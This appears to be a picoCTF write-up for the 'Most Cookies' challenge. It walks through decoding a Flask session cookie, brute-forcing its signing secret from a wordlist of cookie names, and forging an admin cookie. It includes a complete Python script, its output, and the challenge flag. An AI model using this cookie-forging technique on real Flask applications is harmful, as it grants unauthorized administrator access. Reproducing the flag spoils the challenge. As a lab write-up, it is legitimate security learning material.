# Most Cookies
This challenge was not as straightforward as the previous one, so it was quite fun.

First we get `Cookie session` once we check burp suite which in my case turned out to be 

![image](https://github.com/user-attachments/assets/2cc66265-55d7-4642-9c88-a416d5fa5a6b)


`eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zy-RDg.AFb3td31Sd0GuGQ_mMgOcWA5Vpk` when we decode this using Base64 
we get `{"very_auth": "admin"}`. This basically indicates that we need to get `admin` level access.

Now one thing to keep in mind is `Zy-RDg`, this is the part of the cookie which verifies the authenticity 
using a secret key and only with the correct secret key we will be able to proceed.

Now to modify the session cookie, we first need to know the possible cookie names which we get from `server.py`
So, to simultaneously iterate through each possible key while also decoding the session cookie, 
and avoid getting the `BadTimeSignature` error, we use a script

```
import requests
import hashlib
from itsdangerous import URLSafeTimedSerializer
from itsdangerous.exc import BadTimeSignature
from flask.sessions import TaggedJSONSerializer

def flask_cookie(secret_key, cookie_str, operation):
    """
    This function is a simplified version of the SecureCookieSessionInterface to decode or encode
    Flask cookies using a specific secret key.
    """
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    if operation == "decode":
        return s.loads(cookie_str)
    else:
        return s.dumps(cookie_str)

# List of possible secret keys used by the app (flask's default ones)
possible_keys = [
    "snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", 
    "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", 
    "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", 
    "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", 
    "white chocolate macadamia"
]

# The session cookie you obtained from the response
cookie_str = "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Zy-CUQ.ENB95ZonquaCPOx3F_B0iuF6Sg4"

# Try to decode the cookie with each possible key
for possible_secret_key in possible_keys:
    try:
        # Try to decode the session cookie
        cookie_decoded = flask_cookie(possible_secret_key, cookie_str, "decode")
        print(f"Successfully decoded with key: {possible_secret_key}")
        secret_key = possible_secret_key
        print(f"Decoded cookie: {cookie_decoded}")
        break  # Once we find the correct key, stop
    except BadTimeSignature:
        # If decoding fails, continue with the next possible key
        continue

# Once the correct secret key is found, encode the admin cookie
if 'secret_key' in locals():
    admin_cookie = {"very_auth": "admin"}
    admin_cookie_encoded = flask_cookie(secret_key, admin_cookie, "encode")
    print(f"Encoded Admin Cookie: {admin_cookie_encoded}")

    # Send a POST request with the encoded admin cookie to access the flag
    url = "http://mercury.picoctf.net:18835/"
    flag_response = requests.get(url, cookies={"session": admin_cookie_encoded})
    print(f"Flag Page Response: {flag_response.text}")
else:
    print("Failed to decode the session cookie. Please check if the correct secret key is in the list.")
```

And here is the following output that we get:
```
Successfully decoded with key: fortune
Decoded cookie: {'very_auth': 'blank'}
Encoded Admin Cookie: eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zy-RDg.AFb3td31Sd0GuGQ_mMgOcWA5Vpk
```
Now that we have the Encoded session cookie, we get back to burp suite to change `Cookie session` to `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zy-RDg.AFb3td31Sd0GuGQ_mMgOcWA5Vpk`

And thus we get the flag 
__Flag__: `picoCTF{pwn_4ll_th3_cook1E5_743c20eb}`

![image](https://github.com/user-attachments/assets/e36ad3c4-8d4b-482a-a836-2c323dc237b3)
